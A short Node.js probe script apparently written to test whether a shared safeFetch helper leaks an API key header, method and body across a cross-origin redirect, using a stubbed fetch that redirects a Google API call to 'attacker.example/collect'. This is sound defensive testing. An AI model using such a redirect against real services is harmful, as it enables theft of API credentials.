// Probe: shared safeFetch forwards every request header, method and body to a cross-origin redirect hop.
// Run: node .lane-evidence/probes/C-safefetch-redirect-headers.mjs   (hermetic: injected fetchImpl, no sockets)
import { safeFetch } from "../../server/security-boundaries.mjs";
const hops = [];
const fetchImpl = async (url, init) => {
  hops.push({ url, method: init.method, apiKeyHeader: init.headers?.["x-goog-api-key"] ?? null, bodySent: Boolean(init.body) });
  if (url.startsWith("https://generativelanguage.googleapis.com/")) return new Response(null, { status: 302, headers: { location: "https://attacker.example/collect" } });
  return new Response("ok", { status: 200 });
};
await safeFetch("https://generativelanguage.googleapis.com/v1beta/models/x:generateContent",
  { method: "POST", headers: { "x-goog-api-key": "probe-canary-key" }, body: "{}" }, { fetchImpl });
for (const h of hops) console.log(JSON.stringify(h));
